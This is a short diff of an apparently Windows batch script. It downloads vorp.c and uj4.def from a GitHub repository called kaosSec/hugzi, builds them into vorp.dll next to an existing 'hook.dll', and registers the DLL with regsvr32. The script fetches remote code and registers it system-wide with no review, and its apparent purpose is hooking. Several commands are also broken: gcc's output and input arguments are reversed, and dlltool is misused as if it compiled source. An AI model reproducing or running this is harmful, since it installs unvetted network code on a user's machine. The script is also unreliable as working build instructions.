@@ -23,10 +23,15 @@ gcc -o hugzi.c hugzi.exe
 
 curl -L https://github.com/kaosSec/hugzi/raw/main/hook.cpp -o hook.cpp
 curl -L https://github.com/kaosSec/hugzi/raw/main/loz.def -o loz.def
+curl -L https://github.com/kaosSec/hugzi/raw/main/vorp.c -o vorp.c
+curl -L https://github.com/kaosSec/hugzi/raw/main/uj4.def -o uj4.def
+gcc -c -o vorp.o vorp.c
 gcc -c -o hook.o hook.cpp
 dlltool -k -d loz.def -l libfilename.a -D hook.cpp -o hook.dll
+dlltool -k -d uj4.def -l libfilename.a -D vorp.c -o vorp.dll
 
 regsvr32 hook.dll
+regsvr32 vorp.dll
 
 endlocal
 start https://github.com/kaosSec
